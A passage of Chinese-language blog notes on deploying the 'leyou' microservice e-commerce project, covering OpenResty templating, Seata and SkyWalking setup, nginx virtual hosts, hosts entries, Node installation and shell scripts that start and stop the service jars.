class="line">if not specStr then  </span><br><span class="line">   ngx_log(ngx_ERR, &quot;http not found specStr info, cid3 : &quot;, cid3)  </span><br><span class="line">   return ngx_exit(404)  </span><br><span class="line">end</span><br><span class="line">-- 组织数据1</span><br><span class="line">local context = &#123;</span><br><span class="line">	name = spuInfo[&quot;name&quot;],</span><br><span class="line">	skuList =  skuInfoStr,</span><br><span class="line">	detail =  detailInfoStr,</span><br><span class="line">	categories =  categoryStr,</span><br><span class="line">	brand =  brandStr,</span><br><span class="line">	specs =  specStr</span><br><span class="line">&#125;</span><br><span class="line">--渲染模板  1</span><br><span class="line">template.render(&quot;item.html&quot;, context)  </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">将item.html导入到/usr/resty/templates里面</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">这个页面需要从门户拿js文件</span></span><br><span class="line">vi /usr/resty/templates/item.html </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nginx -p /usr/resty/ -c conf/nginx.conf</span><br><span class="line"><span class="comment"># 先启动才能reload</span></span><br><span class="line">nginx -p /usr/resty/ -c conf/nginx.conf -s reload</span><br><span class="line"><span class="comment">#其中的-p主要是指明nginx启动时的配置目录；-c为 Nginx 指定一个配置文件，来代替缺省的。</span></span><br></pre></td></tr></table></figure>

<h2 id="安装seata1-1-0"><a href="#安装seata1-1-0" class="headerlink" title="安装seata1.1.0"></a>安装seata1.1.0</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/seata/seata/releases/download/v1.1.0/seata-server-1.1.0.tar.gz</span><br><span class="line">tar -zxvf seata-server-1.1.0.tar.gz</span><br></pre></td></tr></table></figure>

<p>修改file.conf和registry.conf</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">添加hosts 192.168.58.76 ly-registry</span><br><span class="line"><span class="comment">#将安装包放到文件夹中</span></span><br><span class="line"><span class="built_in">cd</span> seata/conf</span><br><span class="line">vi registry.conf</span><br><span class="line"></span><br><span class="line">registry &#123;</span><br><span class="line">  <span class="comment"># file 、nacos 、eureka、redis、zk、consul、etcd3、sofa</span></span><br><span class="line">  <span class="built_in">type</span> = <span class="string">&quot;eureka&quot;</span></span><br><span class="line">  loadBalance = <span class="string">&quot;RandomLoadBalance&quot;</span></span><br><span class="line">  loadBalanceVirtualNodes = 10</span><br><span class="line">  eureka &#123;</span><br><span class="line">  	<span class="comment"># seata-server 注册到这个注册中心</span></span><br><span class="line">    serviceUrl = <span class="string">&quot;http://ly-registry:10086/eureka&quot;</span></span><br><span class="line">    <span class="comment"># seata—server 在注册中心的名字</span></span><br><span class="line">    application = <span class="string">&quot;seata_service&quot;</span></span><br><span class="line">    weight = <span class="string">&quot;1&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 使用文件方式配置seata</span></span><br><span class="line">config &#123;</span><br><span class="line">  <span class="comment"># file、nacos 、apollo、zk、consul、etcd3</span></span><br><span class="line">  <span class="built_in">type</span> = <span class="string">&quot;file&quot;</span></span><br><span class="line">  file &#123;</span><br><span class="line">    name = <span class="string">&quot;file.conf&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vi file.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">## transaction log store, only used in seata-server</span></span><br><span class="line">store &#123;</span><br><span class="line">  <span class="comment">## store mode: file、db、redis</span></span><br><span class="line">  mode = <span class="string">&quot;file&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">## file store property</span></span><br><span class="line">  file &#123;</span><br><span class="line">    <span class="comment">## store location dir</span></span><br><span class="line">    <span class="built_in">dir</span> = <span class="string">&quot;sessionStore&quot;</span></span><br><span class="line">    <span class="comment"># branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions</span></span><br><span class="line">    maxBranchSessionSize = 16384</span><br><span class="line">    <span class="comment"># globe session size , if exceeded throws exceptions</span></span><br><span class="line">    maxGlobalSessionSize = 512</span><br><span class="line">    <span class="comment"># file buffer size , if exceeded allocate new buffer</span></span><br><span class="line">    fileWriteBufferCacheSize = 16384</span><br><span class="line">    <span class="comment"># when recover batch read size</span></span><br><span class="line">    sessionReloadReadSize = 100</span><br><span class="line">    <span class="comment"># async, sync</span></span><br><span class="line">    flushDiskMode = async</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> seata/bin</span><br><span class="line"><span class="comment"># h代表在注册中心注册的地址 前台运行</span></span><br><span class="line">./seata-server.sh -h 192.168.58.201 -p 8091</span><br><span class="line"><span class="comment"># 后台运行</span></span><br><span class="line"><span class="built_in">nohup</span> ./seata-server.sh -h 192.168.58.201 -p 8091 &gt;log.out 2&gt;1 &amp;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在mysql中建表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `undo_log` (</span><br><span class="line">  `id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `branch_id` <span class="type">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `xid` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `context` <span class="type">varchar</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `rollback_info` longblob <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `log_status` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `log_created` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `log_modified` datetime <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `ext` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`) <span class="keyword">USING</span> BTREE,</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `ux_undo_log` (`xid`,`branch_id`) <span class="keyword">USING</span> BTREE</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 ROW_FORMAT<span class="operator">=</span>COMPACT;</span><br></pre></td></tr></table></figure>

<h2 id="seata和openresty自启动脚本"><a href="#seata和openresty自启动脚本" class="headerlink" title="seata和openresty自启动脚本"></a>seata和openresty自启动脚本</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi leyou-start.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">/root/seata/bin/seata-server.sh -h 192.168.58.209 -p 8091 &gt;log.out 2&gt;1 &amp;</span><br><span class="line">nginx -p /usr/resty/ -c conf/nginx.conf</span><br><span class="line"></span><br><span class="line">chmod +x leyou-start.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">开机自启动-方法一</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">对nginx无效</span></span><br><span class="line">crontab -e</span><br><span class="line">@reboot /root/leyou-start.sh </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">开机自启动-方法二 两个均无效</span></span><br><span class="line">vi /etc/rc.d/rc.local</span><br><span class="line">/root/leyou-start.sh </span><br></pre></td></tr></table></figure>

<h2 id="配置链路追踪skywalking-8"><a href="#配置链路追踪skywalking-8" class="headerlink" title="配置链路追踪skywalking 8"></a>配置链路追踪skywalking 8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">docker安装es7</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">安装jdk8</span></span><br><span class="line">yum install java-1.8.0-openjdk</span><br><span class="line"></span><br><span class="line">wget https://apache.claz.org/skywalking/8.6.0/apache-skywalking-apm-es7-8.6.0.tar.gz</span><br><span class="line">tar -zxvf apache-skywalking-apm-es7-8.6.0.tar.gz</span><br><span class="line">vi apache-skywalking-apm-bin-es7/config/application.yml </span><br><span class="line">选择elasticsearch7为存储引擎，然后修改索引名，然后设置es的位置</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">确保已经启动了es7，且防火墙已经关闭</span></span><br><span class="line">cd apache-skywalking-apm-bin-es7/bin/</span><br><span class="line">./startup.sh</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">端口8080</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/local/src/apache-skywalking-apm-bin/agent/skywalking-agent.jar</span><br></pre></td></tr></table></figure>

<p>Mac:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-registry</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-gateway</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-item-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-page-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-qurtz-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-sms-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-auth-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-search-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-trade-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:/Users/huangmingwang/Documents/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-user-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br></pre></td></tr></table></figure>

<p>windows:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-registry</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-gateway</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-item-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-page-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-qurtz-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-sms-servcie</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-auth-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-search-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-trade-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br><span class="line"></span><br><span class="line">-javaagent:C:/leyou/agent/skywalking-agent.jar</span><br><span class="line">-Dskywalking.agent.service_name=ly-user-service</span><br><span class="line">-Dskywalking.collector.backend_service=81.68.97.129:11800</span><br></pre></td></tr></table></figure>

<h2 id="centos校准时间"><a href="#centos校准时间" class="headerlink" title="centos校准时间"></a>centos校准时间</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// 方案一 有效</span><br><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">reboot</span><br><span class="line">// 方案二</span><br><span class="line">yum -y install ntp</span><br><span class="line"><span class="meta">#</span><span class="language-bash">通过阿里云时间服务器校准时间</span></span><br><span class="line">ntpdate ntp1.aliyun.com</span><br></pre></td></tr></table></figure>

<h4 id="Centos-时区和docker时区问题导致日志被删除"><a href="#Centos-时区和docker时区问题导致日志被删除" class="headerlink" title="Centos 时区和docker时区问题导致日志被删除"></a>Centos 时区和docker时区问题导致日志被删除</h4><p>修改centos时钟</p>
<p>修改docker时区</p>
<p>还有idea的问题，得重启</p>
<p>还有docker ipv4的问题</p>
<p>还有graylog:9000启动需要时间，不能立刻访问到,得等一分钟</p>
<p>浪费两天的时间</p>
<h4 id="docker修改时区"><a href="#docker修改时区" class="headerlink" title="docker修改时区"></a>docker修改时区</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">查时区</span></span><br><span class="line">docker exec 271629a4fb47 date</span><br><span class="line"></span><br><span class="line">-v /etc/localtime:/etc/localtime \</span><br><span class="line">-v /etc/timezone:/etc/timezone \</span><br></pre></td></tr></table></figure>

<h1 id="CentOS7"><a href="#CentOS7" class="headerlink" title="CentOS7"></a>CentOS7</h1><h2 id="安装jdk8-1"><a href="#安装jdk8-1" class="headerlink" title="安装jdk8"></a>安装jdk8</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install java-1.8.0-openjdk</span><br></pre></td></tr></table></figure>

<h2 id="修改hosts"><a href="#修改hosts" class="headerlink" title="修改hosts"></a>修改hosts</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">106.14.29.182 ali-centos</span><br><span class="line">81.68.97.129 tx-centos</span><br><span class="line">192.168.58.162 mac-centos</span><br><span class="line">192.168.58.154 win-centos</span><br><span class="line"></span><br><span class="line">192.168.58.162 ly-gateway</span><br><span class="line">192.168.58.162 ly-registry</span><br><span class="line">192.168.58.154 ly-resty</span><br><span class="line">192.168.58.154 ly-mq</span><br><span class="line">192.168.58.154 ly-es</span><br><span class="line">192.168.58.154 ly-seata</span><br><span class="line">192.168.58.154 ly-mongo</span><br><span class="line">192.168.58.154 ly-redis</span><br><span class="line">192.168.58.154 ly-canal</span><br><span class="line">192.168.58.154 ly-mysql</span><br><span class="line"></span><br><span class="line">81.68.97.129 ly-skywalking</span><br><span class="line">106.14.29.182 ly-graylog</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">在百度智能云上修改域名映射</span></span><br><span class="line">image.wl9939.top 192.168.58.162</span><br><span class="line">doc.wl9939.top 192.168.58.162</span><br><span class="line">api.wl9939.top 192.168.58.162</span><br><span class="line">registry.wl9939.top 192.168.58.162</span><br><span class="line">manage.wl9939.top 192.168.58.162</span><br><span class="line">www.wl9939.top 192.168.58.162</span><br><span class="line">centos.wl9939.top 192.168.58.154</span><br></pre></td></tr></table></figure>

<h2 id="安装git以及常用命令"><a href="#安装git以及常用命令" class="headerlink" title="安装git以及常用命令"></a>安装git以及常用命令</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149306.png" alt="img"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install git</span><br><span class="line"></span><br><span class="line">git clone https://github.com/HuangMingwang/leyou-manage.git</span><br><span class="line"><span class="meta">#</span><span class="language-bash">别放root目录下，nginx可能没有权限访问</span></span><br><span class="line">git clone https://github.com/HuangMingwang/leyou-portal.git</span><br></pre></td></tr></table></figure>

<h2 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://nodejs.org/dist/v14.17.2/node-v14.17.2-linux-x64.tar.xz    # 下载</span><br><span class="line">tar xf node-v14.17.2-linux-x64.tar.xz                                 # 解压</span><br><span class="line">cd node-v14.17.2-linux-x64                                             # 进入解压目录</span><br><span class="line">cp /etc/profile /etc/profile.bak</span><br><span class="line">vi /etc/profile</span><br><span class="line">export PATH=$PATH:/root/node-v14.17.2-linux-x64/bin</span><br><span class="line">source /etc/profile</span><br><span class="line">node -v</span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org # 使用淘宝镜像</span><br></pre></td></tr></table></figure>

<h2 id="安装vue-cli-1"><a href="#安装vue-cli-1" class="headerlink" title="安装vue-cli"></a>安装vue-cli</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cnpm install -g vue-cli</span><br></pre></td></tr></table></figure>

<h2 id="将项目导入"><a href="#将项目导入" class="headerlink" title="将项目导入"></a>将项目导入</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ssh</span></span><br><span class="line">scp /Users/huangmingwang/Desktop/基于微服务架构的类京东电商平台/leyou/ssh.zip root@mac-centos:/opt/leyou</span><br><span class="line"><span class="meta">#</span><span class="language-bash">agent</span></span><br><span class="line">scp /Users/huangmingwang/Desktop/基于微服务架构的类京东电商平台/leyou/agent.zip root@mac-centos:/opt/leyou</span><br><span class="line"></span><br><span class="line">yum intsall unzip</span><br><span class="line">unzip ssh.zip</span><br><span class="line">unzip agent.zip</span><br><span class="line"></span><br><span class="line">cd /root/leyou/leyou-portal</span><br><span class="line"><span class="meta">#</span><span class="language-bash">执行项目初始化</span></span><br><span class="line">npm init -y</span><br><span class="line"><span class="meta">#</span><span class="language-bash">执行vue的安装</span></span><br><span class="line">npm install vue --save</span><br><span class="line"></span><br><span class="line">cd /opt/leyou/leyou-manage</span><br><span class="line">npm install</span><br><span class="line">nohup npm run serve &amp;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">leyou-manage报错</span></span><br><span class="line">rm -rf node_modules</span><br><span class="line">npm install</span><br><span class="line">npm cache clean --force</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="安装nginx-1"><a href="#安装nginx-1" class="headerlink" title="安装nginx"></a>安装nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo yum -y install gcc gcc-c++ #安装gcc环境</span><br><span class="line">sudo yum -y install pcre pcre-devel # 让 nginx 支持重写功能</span><br><span class="line"><span class="meta"># </span><span class="language-bash">zlib 库提供了很多压缩和解压缩的方式，nginx 使用 zlib 对 http 包内容进行 gzip 压缩</span></span><br><span class="line">sudo yum -y install zlib zlib-devel </span><br><span class="line"><span class="meta"># </span><span class="language-bash">安全套接字层密码库，用于通信加密</span></span><br><span class="line">sudo yum -y install openssl openssl-devel</span><br><span class="line">wget http://nginx.org/download/nginx-1.20.1.tar.gz</span><br><span class="line">tar -zxvf nginx-1.20.1.tar.gz</span><br><span class="line"></span><br><span class="line">cd nginx-1.20.1/</span><br><span class="line"><span class="meta"># </span><span class="language-bash">--prefix=/usr/local/nginx  是 nginx 编译安装的目录（推荐），安装完后会在此目录下生成相关文件</span></span><br><span class="line">./configure --prefix=/usr/local/nginx # 检查平台安装环境</span><br><span class="line"></span><br><span class="line">make # 编译</span><br><span class="line">make install # 安装</span><br><span class="line"></span><br><span class="line">vi /usr/local/nginx/conf/nginx.conf </span><br><span class="line">倒数第二行加上 include vhost/*.conf;</span><br><span class="line"></span><br><span class="line">mkdir vhost</span><br><span class="line">vi leyou.conf</span><br><span class="line">server &#123;</span><br><span class="line">        listen   80;</span><br><span class="line">        server_name www.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">        root  /opt/leyou/leyou-portal;</span><br><span class="line">        &#125;</span><br><span class="line">        location /item &#123;</span><br><span class="line">            # 携带hosts地址，避免因代理导致host丢失</span><br><span class="line">            proxy_set_header Host       $host;</span><br><span class="line">						#openresty</span><br><span class="line">            proxy_pass   http://ly-resty;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  registry.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-registry:10086;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  api.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://ly-gateway:10010;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  manage.wl9939.top;</span><br><span class="line">        location / &#123;</span><br><span class="line">                proxy_pass   http://127.0.0.1:9001;</span><br><span class="line">                proxy_connect_timeout 600;</span><br><span class="line">                proxy_read_timeout 5000;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">images</span></span><br><span class="line">scp /Users/huangmingwang/Downloads/images.zip root@mac-centos:/root</span><br><span class="line"><span class="meta">#</span><span class="language-bash">api</span></span><br><span class="line">scp /Users/huangmingwang/Downloads/nginx-1.12.2.zip root@mac-centos:/root</span><br><span class="line"></span><br><span class="line">unzip images.zip</span><br><span class="line">unzip nginx-1.12.2.zip</span><br><span class="line"></span><br><span class="line">cd /root/nginx-1.12.2/html/</span><br><span class="line">cp -r api/ /usr/local/nginx/html/</span><br><span class="line">cp -r images /usr/local/nginx/html/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/local/nginx/sbin/nginx</span><br><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br><span class="line">/usr/local/nginx/sbin/nginx -s stop</span><br><span class="line">ps -ef | grep nginx # 查看服务进程</span><br><span class="line">netstat -anp|grep 9001 </span><br></pre></td></tr></table></figure>

<h2 id="快照：nginx，leyou-manage，leyou-portal"><a href="#快照：nginx，leyou-manage，leyou-portal" class="headerlink" title="快照：nginx，leyou-manage，leyou-portal"></a>快照：nginx，leyou-manage，leyou-portal</h2><h2 id="运行jar包"><a href="#运行jar包" class="headerlink" title="运行jar包"></a>运行jar包</h2><h3 id="Ly-gateway"><a href="#Ly-gateway" class="headerlink" title="Ly-gateway"></a>Ly-gateway</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10086</span></span><br><span class="line">scp ly-registry-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-registry.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-registry.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">这里可替换为你自己的执行程序,其他代码无需更改</span> </span><br><span class="line">APP_NAME=ly-registry-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-registry -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-registry.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">使用说明,用来提示输入参数</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh 执行脚本.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">检查程序是否在运行</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">如果不存在返回1,存在返回0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">启动方法</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">停止方法</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">输出运行状态</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">重启</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">根据输入参数,选择执行对应方法,不输入则执行使用说明</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-gateway-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-gateway-start.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">RESOURCE_NAME=ly-gateway-1.0-SNAPSHOT.jar</span><br><span class="line"> </span><br><span class="line">tpid=`ps -ef|grep $RESOURCE_NAME|grep -v grep|grep -v kill|awk &#x27;&#123;print $2&#125;&#x27;`</span><br><span class="line">if [ $&#123;tpid&#125; ]; 